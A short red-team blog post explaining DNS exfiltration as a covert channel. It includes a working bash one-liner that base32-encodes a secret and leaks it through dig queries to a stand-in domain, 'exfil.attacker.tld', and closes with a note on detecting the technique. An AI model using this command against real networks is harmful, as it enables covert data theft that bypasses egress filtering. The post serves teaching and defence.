---
layout: post
title:  "DNS Exfiltration Explained, With a Working Demo"
date:   2026-07-21 15:25:00 -0300
categories: red-team exfiltration
tags: [dns, exfiltration, c2]
---
When every outbound port is filtered, DNS is almost always still open —
otherwise the network could not resolve anything. That makes it a reliable, if
slow, covert channel. Here is how the technique works end to end.

<!--more-->

The idea: encode your data into subdomains of a domain you control, and read it
off your authoritative name server's query log.

```bash
# Exfil side: base32 a secret into a DNS query
echo "s3cr3t" | base32 | tr -d '=' | \
  while read chunk; do dig "$chunk.exfil.attacker.tld" +short; done
```

On the server, every lookup lands in your logs, chunk by chunk. It is trivially
detectable if anyone is watching query volume and entropy per domain — which is
exactly why DNS monitoring belongs in every blue team's baseline.
